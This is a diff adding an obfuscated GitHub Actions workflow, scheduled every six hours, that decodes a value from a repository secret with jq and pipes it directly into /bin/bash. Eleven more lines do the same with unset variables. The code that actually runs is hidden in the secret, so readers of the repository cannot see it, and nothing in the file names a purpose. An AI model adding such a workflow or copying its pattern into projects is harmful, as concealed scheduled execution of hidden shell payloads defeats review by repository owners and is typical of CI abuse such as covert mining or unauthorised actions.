@@ -1,0 +1,29 @@
+name: wanquancehouu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanquancehouu
+        env:
+          lykg0: ${{ secrets.lykg0 }}
+        run: |
+          echo $lykg0 | jq -r .dbjix808 | /bin/bash
+          echo $uz72 | jq -r .dd310 | /bin/bash
+          echo $tjddj9 | jq -r .fr35 | /bin/bash
+          echo $qeof904 | jq -r .vghp54 | /bin/bash
+          echo $mqbbb82 | jq -r .gjou20268 | /bin/bash
+          echo $bcp9 | jq -r .v7 | /bin/bash
+          echo $ragf7 | jq -r .r9128 | /bin/bash
+          echo $rffa9303 | jq -r .hljmn7 | /bin/bash
+          echo $qnky5 | jq -r .ovs1853 | /bin/bash
+          echo $nrd4 | jq -r .coifu7 | /bin/bash
+          echo $fwn6853 | jq -r .bqfmr220 | /bin/bash
+          echo $do48 | jq -r .seutk879 | /bin/bash
+
